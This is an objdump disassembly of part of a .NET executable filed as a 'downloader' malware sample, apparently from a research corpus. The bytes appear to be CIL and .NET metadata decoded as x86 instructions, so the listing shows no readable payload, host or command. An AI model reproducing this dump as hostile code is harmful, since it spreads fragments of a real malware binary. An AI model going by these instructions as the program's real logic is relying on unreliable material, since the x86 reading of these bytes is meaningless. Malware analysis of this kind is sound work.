
malware_samples/downloader/705e8d65983d6f6ecdce444dea17e33642b7bb3336f627698ac5d32637efcb18.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	00 39                	add    %bh,(%ecx)
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 28 24 00    	add    %al,0x242800
  402013:	00 d0                	add    %dl,%al
  402015:	13 00                	adc    (%eax),%eax
  402017:	00 03                	add    %al,(%ebx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
  402020:	f8                   	clc
  402021:	37                   	aaa
  402022:	00 00                	add    %al,(%eax)
  402024:	b8 00 00 00 00       	mov    $0x0,%eax
	...
  40204d:	00 00                	add    %al,(%eax)
  40204f:	00 22                	add    %ah,(%edx)
  402051:	00 73 0c             	add    %dh,0xc(%ebx)
  402054:	00 00                	add    %al,(%eax)
  402056:	06                   	push   %es
  402057:	26 2a 22             	sub    %es:(%edx),%ah
  40205a:	02 28                	add    (%eax),%ch
  40205c:	14 00                	adc    $0x0,%al
  40205e:	00 0a                	add    %cl,(%edx)
  402060:	00 2a                	add    %ch,(%edx)
  402062:	00 00                	add    %al,(%eax)
  402064:	13 30                	adc    (%eax),%esi
  402066:	02 00                	add    (%eax),%al
  402068:	2b 00                	sub    (%eax),%eax
  40206a:	00 00                	add    %al,(%eax)
  40206c:	01 00                	add    %eax,(%eax)
  40206e:	00 11                	add    %dl,(%ecx)
  402070:	00 03                	add    %al,(%ebx)
  402072:	2c 0b                	sub    $0xb,%al
  402074:	02 7b 01             	add    0x1(%ebx),%bh
  402077:	00 00                	add    %al,(%eax)
  402079:	04 14                	add    $0x14,%al
  40207b:	fe 03                	incb   (%ebx)
  40207d:	2b 01                	sub    (%ecx),%eax
  40207f:	16                   	push   %ss
  402080:	0a 06                	or     (%esi),%al
  402082:	2c 0e                	sub    $0xe,%al
  402084:	00 02                	add    %al,(%edx)
  402086:	7b 01                	jnp    0x402089
  402088:	00 00                	add    %al,(%eax)
  40208a:	04 6f                	add    $0x6f,%al
  40208c:	15 00 00 0a 00       	adc    $0xa0000,%eax
  402091:	00 02                	add    %al,(%edx)
  402093:	03 28                	add    (%eax),%ebp
  402095:	16                   	push   %ss
  402096:	00 00                	add    %al,(%eax)
  402098:	0a 00                	or     (%eax),%al
  40209a:	2a de                	sub    %dh,%bl
  40209c:	00 02                	add    %al,(%edx)
  40209e:	73 17                	jae    0x4020b7
  4020a0:	00 00                	add    %al,(%eax)
  4020a2:	0a 7d 01             	or     0x1(%ebp),%bh
  4020a5:	00 00                	add    %al,(%eax)
  4020a7:	04 02                	add    $0x2,%al
  4020a9:	17                   	pop    %ss
  4020aa:	28 18                	sub    %bl,(%eax)
  4020ac:	00 00                	add    %al,(%eax)
  4020ae:	0a 00                	or     (%eax),%al
  4020b0:	02 20                	add    (%eax),%ah
  4020b2:	20 03                	and    %al,(%ebx)
  4020b4:	00 00                	add    %al,(%eax)
  4020b6:	20 c2                	and    %al,%dl
  4020b8:	01 00                	add    %eax,(%eax)
  4020ba:	00 73 19             	add    %dh,0x19(%ebx)
  4020bd:	00 00                	add    %al,(%eax)
  4020bf:	0a 28                	or     (%eax),%ch
  4020c1:	1a 00                	sbb    (%eax),%al
  4020c3:	00 0a                	add    %cl,(%edx)
  4020c5:	00 02                	add    %al,(%edx)
  4020c7:	72 01                	jb     0x4020ca
  4020c9:	00 00                	add    %al,(%eax)
  4020cb:	70 6f                	jo     0x40213c
  4020cd:	1b 00                	sbb    (%eax),%eax
  4020cf:	00 0a                	add    %cl,(%edx)
  4020d1:	00 2a                	add    %ch,(%edx)
  4020d3:	5e                   	pop    %esi
  4020d4:	02 14 7d 01 00 00 04 	add    0x4000001(,%edi,2),%dl
  4020db:	02 28                	add    (%eax),%ch
  4020dd:	1c 00                	sbb    $0x0,%al
  4020df:	00 0a                	add    %cl,(%edx)
  4020e1:	00 00                	add    %al,(%eax)
  4020e3:	02 28                	add    (%eax),%ch
  4020e5:	04 00                	add    $0x0,%al
  4020e7:	00 06                	add    %al,(%esi)
  4020e9:	00 2a                	add    %ch,(%edx)
  4020eb:	00 13                	add    %dl,(%ebx)
  4020ed:	30 03                	xor    %al,(%ebx)
  4020ef:	00 61 00             	add    %ah,0x0(%ecx)
  4020f2:	00 00                	add    %al,(%eax)
  4020f4:	02 00                	add    (%eax),%al
  4020f6:	00 11                	add    %dl,(%ecx)
  4020f8:	00 03                	add    %al,(%ebx)
  4020fa:	0a 73 1d             	or     0x1d(%ebx),%dh
  4020fd:	00 00                	add    %al,(%eax)
  4020ff:	0a 0b                	or     (%ebx),%cl
  402101:	07                   	pop    %es
  402102:	6f                   	outsl  %ds:(%esi),(%dx)
  402103:	1e                   	push   %ds
  402104:	00 00                	add    %al,(%eax)
  402106:	0a 72 0d             	or     0xd(%edx),%dh
  402109:	00 00                	add    %al,(%eax)
  40210b:	70 6f                	jo     0x40217c
  40210d:	1f                   	pop    %ds
  40210e:	00 00                	add    %al,(%eax)
  402110:	0a 00                	or     (%eax),%al
  402112:	07                   	pop    %es
  402113:	6f                   	outsl  %ds:(%esi),(%dx)
  402114:	1e                   	push   %ds
  402115:	00 00                	add    %al,(%eax)
  402117:	0a 72 15             	or     0x15(%edx),%dh
  40211a:	00 00                	add    %al,(%eax)
  40211c:	70 6f                	jo     0x40218d
  40211e:	20 00                	and    %al,(%eax)
  402120:	00 0a                	add    %cl,(%edx)
  402122:	00 07                	add    %al,(%edi)
  402124:	6f                   	outsl  %ds:(%esi),(%dx)
  402125:	1e                   	push   %ds
  402126:	00 00                	add    %al,(%eax)
  402128:	0a 17                	or     (%edi),%dl
  40212a:	6f                   	outsl  %ds:(%esi),(%dx)
  40212b:	21 00                	and    %eax,(%eax)
  40212d:	00 0a                	add    %cl,(%edx)
  40212f:	00 07                	add    %al,(%edi)
  402131:	6f                   	outsl  %ds:(%esi),(%dx)
  402132:	22 00                	and    (%eax),%al
  402134:	00 0a                	add    %cl,(%edx)
  402136:	26 2b 02             	sub    %es:(%edx),%eax
  402139:	00 00                	add    %al,(%eax)
  40213b:	07                   	pop    %es
  40213c:	6f                   	outsl  %ds:(%esi),(%dx)
  40213d:	23 00                	and    (%eax),%eax
  40213f:	00 0a                	add    %cl,(%edx)
  402141:	16                   	push   %ss
  402142:	fe 01                	incb   (%ecx)
  402144:	0c 08                	or     $0x8,%al
  402146:	2d f1 06 16 06       	sub    $0x61606f1,%eax
  40214b:	8e 69 28             	mov    0x28(%ecx),%gs
  40214e:	24 00                	and    $0x0,%al
  402150:	00 0a                	add    %cl,(%edx)
  402152:	00 06                	add    %al,(%esi)
  402154:	0d 2b 00 09 2a       	or     $0x2a09002b,%eax
  402159:	00 00                	add    %al,(%eax)
  40215b:	00 13                	add    %dl,(%ebx)
  40215d:	30 02                	xor    %al,(%edx)
  40215f:	00 29                	add    %ch,(%ecx)
  402161:	00 00                	add    %al,(%eax)
  402163:	00 03                	add    %al,(%ebx)
  402165:	00 00                	add    %al,(%eax)
  402167:	11 00                	adc    %eax,(%eax)
  402169:	73 25                	jae    0x402190
  40216b:	00 00                	add    %al,(%eax)
  40216d:	0a 0a                	or     (%edx),%cl
  40216f:	02 03                	add    (%ebx),%al
  402171:	28 08                	sub    %cl,(%eax)
  402173:	00 00                	add    %al,(%eax)
  402175:	06                   	push   %es
  402176:	06                   	push   %es
  402177:	6f                   	outsl  %ds:(%esi),(%dx)
  402178:	26 00 00             	add    %al,%es:(%eax)
  40217b:	0a 00                	or     (%eax),%al
  40217d:	06                   	push   %es
  40217e:	6f                   	outsl  %ds:(%esi),(%dx)
  40217f:	27                   	daa
  402180:	00 00                	add    %al,(%eax)
  402182:	0a 0b                	or     (%ebx),%cl
  402184:	06                   	push   %es
  402185:	6f                   	outsl  %ds:(%esi),(%dx)
  402186:	28 00                	sub    %al,(%eax)
  402188:	00 0a                	add    %cl,(%edx)
  40218a:	00 07                	add    %al,(%edi)
  40218c:	0c 2b                	or     $0x2b,%al
  40218e:	00 08                	add    %cl,(%eax)
  402190:	2a 00                	sub    (%eax),%al
  402192:	00 00                	add    %al,(%eax)
  402194:	1b 30                	sbb    (%eax),%esi
  402196:	01 00                	add    %eax,(%eax)
  402198:	3a 00                	cmp    (%eax),%al
  40219a:	00 00                	add    %al,(%eax)
  40219c:	04 00                	add    $0x0,%al
  40219e:	00 11                	add    %dl,(%ecx)
  4021a0:	00 00                	add    %al,(%eax)
  4021a2:	20 00                	and    %al,(%eax)
  4021a4:	0c 00                	or     $0x0,%al
  4021a6:	00 28                	add    %ch,(%eax)
  4021a8:	29 00                	sub    %eax,(%eax)
  4021aa:	00 0a                	add    %cl,(%edx)
  4021ac:	00 00                	add    %al,(%eax)
  4021ae:	de 05 26 00 00 de    	fiadds 0xde000026
  4021b4:	00 03                	add    %al,(%ebx)
  4021b6:	28 2a                	sub    %ch,(%edx)
  4021b8:	00 00                	add    %al,(%eax)
  4021ba:	0a 74 17 00          	or     0x0(%edi,%edx,1),%dh
  4021be:	00 01                	add    %al,(%ecx)
  4021c0:	0a 06                	or     (%esi),%al
  4021c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4021c3:	2b 00                	sub    (%eax),%eax
  4021c5:	00 0a                	add    %cl,(%edx)
  4021c7:	74 18                	je     0x4021e1
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	01 0b                	add    %ecx,(%ebx)
  4021cd:	07                   	pop    %es
  4021ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4021cf:	2c 00                	sub    $0x0,%al
  4021d1:	00 0a                	add    %cl,(%edx)
  4021d3:	0c 08                	or     $0x8,%al
  4021d5:	0d 2b 00 09 2a       	or     $0x2a09002b,%eax
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	01 10                	add    %edx,(%eax)
  4021de:	00 00                	add    %al,(%eax)
  4021e0:	00 00                	add    %al,(%eax)
  4021e2:	01 00                	add    %eax,(%eax)
  4021e4:	0f 10 00             	movups (%eax),%xmm0
  4021e7:	05 10 00 00 01       	add    $0x1000010,%eax
  4021ec:	13 30                	adc    (%eax),%esi
  4021ee:	03 00                	add    (%eax),%eax
  4021f0:	1c 00                	sbb    $0x0,%al
  4021f2:	00 00                	add    %al,(%eax)
  4021f4:	05 00 00 11 00       	add    $0x110000,%eax
  4021f9:	02 02                	add    (%edx),%al
  4021fb:	72 49                	jb     0x402246
  4021fd:	00 00                	add    %al,(%eax)
  4021ff:	70 28                	jo     0x402229
  402201:	07                   	pop    %es
  402202:	00 00                	add    %al,(%eax)
  402204:	06                   	push   %es
  402205:	28 06                	sub    %al,(%esi)
  402207:	00 00                	add    %al,(%eax)
  402209:	06                   	push   %es
  40220a:	28 2d 00 00 0a 0a    	sub    %ch,0xa0a0000
  402210:	2b 00                	sub    (%eax),%eax
  402212:	06                   	push   %es
  402213:	2a 13                	sub    (%ebx),%dl
  402215:	30 02                	xor    %al,(%edx)
  402217:	00 2b                	add    %ch,(%ebx)
  402219:	00 00                	add    %al,(%eax)
  40221b:	00 01                	add    %al,(%ecx)
  40221d:	00 00                	add    %al,(%eax)
  40221f:	11 00                	adc    %eax,(%eax)
  402221:	03 2c 0b             	add    (%ebx,%ecx,1),%ebp
  402224:	02 7b 02             	add    0x2(%ebx),%bh
  402227:	00 00                	add    %al,(%eax)
  402229:	04 14                	add    $0x14,%al
  40222b:	fe 03                	incb   (%ebx)
  40222d:	2b 01                	sub    (%ecx),%eax
  40222f:	16                   	push   %ss
  402230:	0a 06                	or     (%esi),%al
  402232:	2c 0e                	sub    $0xe,%al
  402234:	00 02                	add    %al,(%edx)
  402236:	7b 02                	jnp    0x40223a
  402238:	00 00                	add    %al,(%eax)
  40223a:	04 6f                	add    $0x6f,%al
  40223c:	15 00 00 0a 00       	adc    $0xa0000,%eax
  402241:	00 02                	add    %al,(%edx)
  402243:	03 28                	add    (%eax),%ebp
  402245:	16                   	push   %ss
  402246:	00 00                	add    %al,(%eax)
  402248:	0a 00                	or     (%eax),%al
  40224a:	2a 00                	sub    (%eax),%al
  40224c:	13 30                	adc    (%eax),%esi
  40224e:	03 00                	add    (%eax),%eax
  402250:	43                   	inc    %ebx
	...
  402259:	02 73 17             	add    0x17(%ebx),%dh
  40225c:	00 00                	add    %al,(%eax)
  40225e:	0a 7d 02             	or     0x2(%ebp),%bh
  402261:	00 00                	add    %al,(%eax)
  402263:	04 02                	add    $0x2,%al
  402265:	17                   	pop    %ss
  402266:	28 18                	sub    %bl,(%eax)
  402268:	00 00                	add    %al,(%eax)
  40226a:	0a 00                	or     (%eax),%al
  40226c:	02 20                	add    (%eax),%ah
  40226e:	20 03                	and    %al,(%ebx)
  402270:	00 00                	add    %al,(%eax)
  402272:	20 c2                	and    %al,%dl
  402274:	01 00                	add    %eax,(%eax)
  402276:	00 73 19             	add    %dh,0x19(%ebx)
  402279:	00 00                	add    %al,(%eax)
  40227b:	0a 28                	or     (%eax),%ch
  40227d:	1a 00                	sbb    (%eax),%al
  40227f:	00 0a                	add    %cl,(%edx)
  402281:	00 02                	add    %al,(%edx)
  402283:	72 0c                	jb     0x402291
  402285:	01 00                	add    %eax,(%eax)
  402287:	70 6f                	jo     0x4022f8
  402289:	1b 00                	sbb    (%eax),%eax
  40228b:	00 0a                	add    %cl,(%edx)
  40228d:	00 02                	add    %al,(%edx)
  40228f:	72 58                	jb     0x4022e9
  402291:	01 00                	add    %eax,(%eax)
  402293:	70 28                	jo     0x4022bd
  402295:	2e 00 00             	add    %al,%cs:(%eax)
  402298:	0a 00                	or     (%eax),%al
  40229a:	2a 7a 02             	sub    0x2(%edx),%bh
  40229d:	14 7d                	adc    $0x7d,%al
  40229f:	02 00                	add    (%eax),%al
  4022a1:	00 04 02             	add    %al,(%edx,%eax,1)
  4022a4:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  4022a7:	00 0a                	add    %cl,(%edx)
  4022a9:	00 00                	add    %al,(%eax)
  4022ab:	02 28                	add    (%eax),%ch
  4022ad:	0b 00                	or     (%eax),%eax
  4022af:	00 06                	add    %al,(%esi)
  4022b1:	00 02                	add    %al,(%edx)
  4022b3:	28 0d 00 00 06 00    	sub    %cl,0x60000
  4022b9:	2a 00                	sub    (%eax),%al
  4022bb:	00 13                	add    %dl,(%ebx)
  4022bd:	30 06                	xor    %al,(%esi)
  4022bf:	00 90 00 00 00 06    	add    %dl,0x6000000(%eax)
  4022c5:	00 00                	add    %al,(%eax)
  4022c7:	11 00                	adc    %eax,(%eax)
  4022c9:	73 05                	jae    0x4022d0
  4022cb:	00 00                	add    %al,(%eax)
  4022cd:	06                   	push   %es
  4022ce:	28 09                	sub    %cl,(%ecx)
  4022d0:	00 00                	add    %al,(%eax)
  4022d2:	06                   	push   %es
  4022d3:	0a 06                	or     (%esi),%al
  4022d5:	14 28                	adc    $0x28,%al
  4022d7:	2f                   	das
  4022d8:	00 00                	add    %al,(%eax)
  4022da:	0a 0b                	or     (%ebx),%cl
  4022dc:	07                   	pop    %es
  4022dd:	2c 06                	sub    $0x6,%al
  4022df:	73 30                	jae    0x402311
  4022e1:	00 00                	add    %al,(%eax)
  4022e3:	0a 7a 00             	or     0x0(%edx),%bh
  4022e6:	06                   	push   %es
  4022e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4022e8:	31 00                	xor    %eax,(%eax)
  4022ea:	00 0a                	add    %cl,(%edx)
  4022ec:	02 fe                	add    %dh,%bh
  4022ee:	06                   	push   %es
  4022ef:	0e                   	push   %cs
  4022f0:	00 00                	add    %al,(%eax)
  4022f2:	06                   	push   %es
  4022f3:	73 32                	jae    0x402327
  4022f5:	00 00                	add    %al,(%eax)
  4022f7:	0a 28                	or     (%eax),%ch
  4022f9:	01 00                	add    %eax,(%eax)
  4022fb:	00 2b                	add    %ch,(%ebx)
  4022fd:	0c 08                	or     $0x8,%al
  4022ff:	14 28                	adc    $0x28,%al
  402301:	34 00                	xor    $0x0,%al
  402303:	00 0a                	add    %cl,(%edx)
  402305:	0d 09 2c 06 73       	or     $0x73062c09,%eax
  40230a:	30 00                	xor    %al,(%eax)
  40230c:	00 0a                	add    %cl,(%edx)
  40230e:	7a 00                	jp     0x402310
  402310:	08 6f 35             	or     %ch,0x35(%edi)
  402313:	00 00                	add    %al,(%eax)
  402315:	0a 02                	or     (%edx),%al
  402317:	fe 06                	incb   (%esi)
  402319:	0f 00 00             	sldt   (%eax)
  40231c:	06                   	push   %es
  40231d:	73 36                	jae    0x402355
  40231f:	00 00                	add    %al,(%eax)
  402321:	0a 28                	or     (%eax),%ch
  402323:	02 00                	add    (%eax),%al
  402325:	00 2b                	add    %ch,(%ebx)
  402327:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40232a:	04 14                	add    $0x14,%al
  40232c:	28 37                	sub    %dh,(%edi)
  40232e:	00 00                	add    %al,(%eax)
  402330:	0a 13                	or     (%ebx),%dl
  402332:	05 11 05 2c 06       	add    $0x62c0511,%eax
  402337:	73 30                	jae    0x402369
  402339:	00 00                	add    %al,(%eax)
  40233b:	0a 7a 00             	or     0x0(%edx),%bh
  40233e:	08 11                	or     %dl,(%ecx)
  402340:	04 6f                	add    $0x6f,%al
  402342:	38 00                	cmp    %al,(%eax)
  402344:	00 0a                	add    %cl,(%edx)
  402346:	20 00                	and    %al,(%eax)
  402348:	01 00                	add    %eax,(%eax)
  40234a:	00 14 14             	add    %dl,(%esp,%edx,1)
  40234d:	14 6f                	adc    $0x6f,%al
  40234f:	39 00                	cmp    %eax,(%eax)
  402351:	00 0a                	add    %cl,(%edx)
  402353:	26 00 00             	add    %al,%es:(%eax)
  402356:	00 2a                	add    %ch,(%edx)
  402358:	4a                   	dec    %edx
  402359:	03 6f 3a             	add    0x3a(%edi),%ebp
  40235c:	00 00                	add    %al,(%eax)
  40235e:	0a 02                	or     (%edx),%al
  402360:	6f                   	outsl  %ds:(%esi),(%dx)
  402361:	3b 00                	cmp    (%eax),%eax
  402363:	00 0a                	add    %cl,(%edx)
  402365:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  402368:	00 0a                	add    %cl,(%edx)
  40236a:	2a 4a 03             	sub    0x3(%edx),%cl
  40236d:	6f                   	outsl  %ds:(%esi),(%dx)
  40236e:	38 00                	cmp    %al,(%eax)
  402370:	00 0a                	add    %cl,(%edx)
  402372:	02 28                	add    (%eax),%ch
  402374:	3d 00 00 0a 28       	cmp    $0x280a0000,%eax
  402379:	3c 00                	cmp    $0x0,%al
  40237b:	00 0a                	add    %cl,(%edx)
  40237d:	2a 26                	sub    (%esi),%ah
  40237f:	02 28                	add    (%eax),%ch
  402381:	14 00                	adc    $0x0,%al
  402383:	00 0a                	add    %cl,(%edx)
  402385:	00 00                	add    %al,(%eax)
  402387:	2a 13                	sub    (%ebx),%dl
  402389:	30 02                	xor    %al,(%edx)
  40238b:	00 39                	add    %bh,(%ecx)
  40238d:	00 00                	add    %al,(%eax)
  40238f:	00 07                	add    %al,(%edi)
  402391:	00 00                	add    %al,(%eax)
  402393:	11 00                	adc    %eax,(%eax)
  402395:	7e 03                	jle    0x40239a
  402397:	00 00                	add    %al,(%eax)
  402399:	04 14                	add    $0x14,%al
  40239b:	fe 01                	incb   (%ecx)
  40239d:	0a 06                	or     (%esi),%al
  40239f:	2c 22                	sub    $0x22,%al
  4023a1:	00 72 86             	add    %dh,-0x7a(%edx)
  4023a4:	01 00                	add    %eax,(%eax)
  4023a6:	70 d0                	jo     0x402378
  4023a8:	05 00 00 02 28       	add    $0x28020000,%eax
  4023ad:	3e 00 00             	add    %al,%ds:(%eax)
  4023b0:	0a 6f 3f             	or     0x3f(%edi),%ch
  4023b3:	00 00                	add    %al,(%eax)
  4023b5:	0a 73 40             	or     0x40(%ebx),%dh
  4023b8:	00 00                	add    %al,(%eax)
  4023ba:	0a 0b                	or     (%ebx),%cl
  4023bc:	07                   	pop    %es
  4023bd:	80 03 00             	addb   $0x0,(%ebx)
  4023c0:	00 04 00             	add    %al,(%eax,%eax,1)
  4023c3:	7e 03                	jle    0x4023c8
  4023c5:	00 00                	add    %al,(%eax)
  4023c7:	04 0c                	add    $0xc,%al
  4023c9:	2b 00                	sub    (%eax),%eax
  4023cb:	08 2a                	or     %ch,(%edx)
  4023cd:	00 00                	add    %al,(%eax)
  4023cf:	00 13                	add    %dl,(%ebx)
  4023d1:	30 01                	xor    %al,(%ecx)
  4023d3:	00 0b                	add    %cl,(%ebx)
  4023d5:	00 00                	add    %al,(%eax)
  4023d7:	00 08                	add    %cl,(%eax)
  4023d9:	00 00                	add    %al,(%eax)
  4023db:	11 00                	adc    %eax,(%eax)
  4023dd:	7e 04                	jle    0x4023e3
  4023df:	00 00                	add    %al,(%eax)
  4023e1:	04 0a                	add    $0xa,%al
  4023e3:	2b 00                	sub    (%eax),%eax
  4023e5:	06                   	push   %es
  4023e6:	2a 22                	sub    (%edx),%ah
  4023e8:	00 02                	add    %al,(%edx)
  4023ea:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  4023ee:	04 2a                	add    $0x2a,%al
  4023f0:	13 30                	adc    (%eax),%esi
  4023f2:	01 00                	add    %eax,(%eax)
  4023f4:	0b 00                	or     (%eax),%eax
  4023f6:	00 00                	add    %al,(%eax)
  4023f8:	09 00                	or     %eax,(%eax)
  4023fa:	00 11                	add    %dl,(%ecx)
  4023fc:	00 7e 05             	add    %bh,0x5(%esi)
  4023ff:	00 00                	add    %al,(%eax)
  402401:	04 0a                	add    $0xa,%al
  402403:	2b 00                	sub    (%eax),%eax
  402405:	06                   	push   %es
  402406:	2a 22                	sub    (%edx),%ah
  402408:	02 28                	add    (%eax),%ch
  40240a:	41                   	inc    %ecx
  40240b:	00 00                	add    %al,(%eax)
  40240d:	0a 00                	or     (%eax),%al
  40240f:	2a 56 73             	sub    0x73(%esi),%dl
  402412:	15 00 00 06 28       	adc    $0x28060000,%eax
  402417:	42                   	inc    %edx
  402418:	00 00                	add    %al,(%eax)
  40241a:	0a 74 06 00          	or     0x0(%esi,%eax,1),%dh
  40241e:	00 02                	add    %al,(%edx)
  402420:	80 05 00 00 04 2a 00 	addb   $0x0,0x2a040000
  402427:	00 42 53             	add    %al,0x53(%edx)
  40242a:	4a                   	dec    %edx
  40242b:	42                   	inc    %edx
  40242c:	01 00                	add    %eax,(%eax)
  40242e:	01 00                	add    %eax,(%eax)
  402430:	00 00                	add    %al,(%eax)
  402432:	00 00                	add    %al,(%eax)
  402434:	0c 00                	or     $0x0,%al
  402436:	00 00                	add    %al,(%eax)
  402438:	76 34                	jbe    0x40246e
  40243a:	2e 30 2e             	xor    %ch,%cs:(%esi)
  40243d:	33 30                	xor    (%eax),%esi
  40243f:	33 31                	xor    (%ecx),%esi
  402441:	39 00                	cmp    %eax,(%eax)
  402443:	00 00                	add    %al,(%eax)
  402445:	00 05 00 6c 00 00    	add    %al,0x6c00
  40244b:	00 94 06 00 00 23 7e 	add    %dl,0x7e230000(%esi,%eax,1)
  402452:	00 00                	add    %al,(%eax)
  402454:	00 07                	add    %al,(%edi)
  402456:	00 00                	add    %al,(%eax)
  402458:	88 07                	mov    %al,(%edi)
  40245a:	00 00                	add    %al,(%eax)
  40245c:	23 53 74             	and    0x74(%ebx),%edx
  40245f:	72 69                	jb     0x4024ca
  402461:	6e                   	outsb  %ds:(%esi),(%dx)
  402462:	67 73 00             	addr16 jae 0x402465
  402465:	00 00                	add    %al,(%eax)
  402467:	00 88 0e 00 00 bc    	add    %cl,-0x43fffff2(%eax)
  40246d:	01 00                	add    %eax,(%eax)
  40246f:	00 23                	add    %ah,(%ebx)
  402471:	55                   	push   %ebp
  402472:	53                   	push   %ebx
  402473:	00 44 10 00          	add    %al,0x0(%eax,%edx,1)
  402477:	00 10                	add    %dl,(%eax)
  402479:	00 00                	add    %al,(%eax)
  40247b:	00 23                	add    %ah,(%ebx)
  40247d:	47                   	inc    %edi
  40247e:	55                   	push   %ebp
  40247f:	49                   	dec    %ecx
  402480:	44                   	inc    %esp
  402481:	00 00                	add    %al,(%eax)
  402483:	00 54 10 00          	add    %dl,0x0(%eax,%edx,1)
  402487:	00 7c 03 00          	add    %bh,0x0(%ebx,%eax,1)
  40248b:	00 23                	add    %ah,(%ebx)
  40248d:	42                   	inc    %edx
  40248e:	6c                   	insb   (%dx),%es:(%edi)
  40248f:	6f                   	outsl  %ds:(%esi),(%dx)
  402490:	62 00                	bound  %eax,(%eax)
  402492:	00 00                	add    %al,(%eax)
  402494:	00 00                	add    %al,(%eax)
  402496:	00 00                	add    %al,(%eax)
  402498:	02 00                	add    (%eax),%al
  40249a:	00 01                	add    %al,(%ecx)
  40249c:	57                   	push   %edi
  40249d:	15 a2 09 09 09       	adc    $0x90909a2,%eax
  4024a2:	00 00                	add    %al,(%eax)
  4024a4:	00 fa                	add    %bh,%dl
  4024a6:	01 33                	add    %esi,(%ebx)
  4024a8:	00 16                	add    %dl,(%esi)
  4024aa:	00 00                	add    %al,(%eax)
  4024ac:	01 00                	add    %eax,(%eax)
  4024ae:	00 00                	add    %al,(%eax)
  4024b0:	3a 00                	cmp    (%eax),%al
  4024b2:	00 00                	add    %al,(%eax)
  4024b4:	06                   	push   %es
  4024b5:	00 00                	add    %al,(%eax)
  4024b7:	00 05 00 00 00 16    	add    %al,0x16000000
  4024bd:	00 00                	add    %al,(%eax)
  4024bf:	00 09                	add    %cl,(%ecx)
  4024c1:	00 00                	add    %al,(%eax)
  4024c3:	00 42 00             	add    %al,0x0(%edx)
  4024c6:	00 00                	add    %al,(%eax)
  4024c8:	18 00                	sbb    %al,(%eax)
  4024ca:	00 00                	add    %al,(%eax)
  4024cc:	09 00                	or     %eax,(%eax)
  4024ce:	00 00                	add    %al,(%eax)
  4024d0:	02 00                	add    (%eax),%al
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	03 00                	add    (%eax),%eax
  4024d6:	00 00                	add    %al,(%eax)
  4024d8:	04 00                	add    $0x0,%al
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	02 00                	add    (%eax),%al
  4024de:	00 00                	add    %al,(%eax)
  4024e0:	01 00                	add    %eax,(%eax)
  4024e2:	00 00                	add    %al,(%eax)
  4024e4:	05 00 00 00 01       	add    $0x1000000,%eax
  4024e9:	00 00                	add    %al,(%eax)
  4024eb:	00 02                	add    %al,(%edx)
  4024ed:	00 00                	add    %al,(%eax)
  4024ef:	00 00                	add    %al,(%eax)
  4024f1:	00 db                	add    %bl,%bl
  4024f3:	03 01                	add    (%ecx),%eax
  4024f5:	00 00                	add    %al,(%eax)
  4024f7:	00 00                	add    %al,(%eax)
  4024f9:	00 06                	add    %al,(%esi)
  4024fb:	00 4a 03             	add    %cl,0x3(%edx)
  4024fe:	04 06                	add    $0x6,%al
  402500:	06                   	push   %es
  402501:	00 b7 03 04 06 06    	add    %dh,0x6060403(%edi)
  402507:	00 65 02             	add    %ah,0x2(%ebp)
  40250a:	c7 05 0f 00 5a 06 00 	movl   $0x60000,0x65a000f
  402511:	00 06 00 
  402514:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402515:	02 dd                	add    %ch,%bl
  402517:	04 06                	add    $0x6,%al
  402519:	00 2d 03 dd 04 06    	add    %ch,0x604dd03
  40251f:	00 0e                	add    %cl,(%esi)
  402521:	03 dd                	add    %ebp,%ebx
  402523:	04 06                	add    $0x6,%al
  402525:	00 9e 03 dd 04 06    	add    %bl,0x604dd03(%esi)
  40252b:	00 6a 03             	add    %ch,0x3(%edx)
  40252e:	dd 04 06             	fldl   (%esi,%eax,1)
  402531:	00 83 03 dd 04 06    	add    %al,0x604dd03(%ebx)
  402537:	00 bd 02 dd 04 06    	add    %bh,0x604dd02(%ebp)
  40253d:	00 92 02 e5 05 06    	add    %dl,0x605e502(%edx)
  402543:	00 23                	add    %ah,(%ebx)
  402545:	02 e5                	add    %ch,%ah
  402547:	05 06 00 f1 02       	add    $0x2f10006,%eax
  40254c:	dd 04 06             	fldl   (%esi,%eax,1)
  40254f:	00 d8                	add    %bl,%al
  402551:	02 f5                	add    %ch,%dh
  402553:	03 06                	add    (%esi),%eax
  402555:	00 eb                	add    %ch,%bl
  402557:	06                   	push   %es
  402558:	96                   	xchg   %eax,%esi
  402559:	04 06                	add    $0x6,%al
  40255b:	00 f5                	add    %dh,%ch
  40255d:	01 96 04 0a 00 9d    	add    %edx,-0x62fff5fc(%esi)
  402563:	04 a4                	add    $0xa4,%al
  402565:	06                   	push   %es
  402566:	0e                   	push   %cs
  402567:	00 af 05 2f 04 0e    	add    %ch,0xe042f05(%edi)
  40256d:	00 b9 06 c7 05 06    	add    %bh,0x605c706(%ecx)
  402573:	00 81 04 4d 00 06    	add    %al,0x6004d04(%ecx)
  402579:	00 87 04 4d 00 0e    	add    %al,0xe004d04(%edi)
  40257f:	00 32                	add    %dh,(%edx)
  402581:	07                   	pop    %es
  402582:	f2 06                	repnz push %es
  402584:	0e                   	push   %cs
  402585:	00 a8 01 f2 06 06    	add    %ch,0x606f201(%eax)
  40258b:	00 69 07             	add    %ch,0x7(%ecx)
  40258e:	dd 04 06             	fldl   (%esi,%eax,1)
  402591:	00 57 01             	add    %dl,0x1(%edi)
  402594:	96                   	xchg   %eax,%esi
  402595:	04 06                	add    $0x6,%al
  402597:	00 07                	add    %al,(%edi)
  402599:	05 dd 04 06 00       	add    $0x604dd,%eax
  40259e:	08 02                	or     %al,(%edx)
  4025a0:	04 06                	add    $0x6,%al
  4025a2:	0e                   	push   %cs
  4025a3:	00 31                	add    %dh,(%ecx)
